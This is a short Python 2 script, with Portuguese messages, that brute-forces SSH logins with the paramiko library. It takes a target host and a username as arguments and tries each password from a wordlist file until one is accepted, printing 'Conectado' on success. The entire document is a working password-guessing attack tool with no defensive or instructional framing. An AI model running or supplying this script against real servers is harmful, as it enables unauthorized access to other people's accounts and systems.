#!/usr/bin/python
import paramiko, sys

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
f = open("lista.txt")
for line in f.readlines():
	senha = line.split()
	try:
		ssh.connect(sys.argv[1], username=sys.argv[2], password=senha[0])

	except paramiko.AuthenticationException:
		print "Acesso negado",line
	else:
		print "Conectado",line
		break
ssh.close()
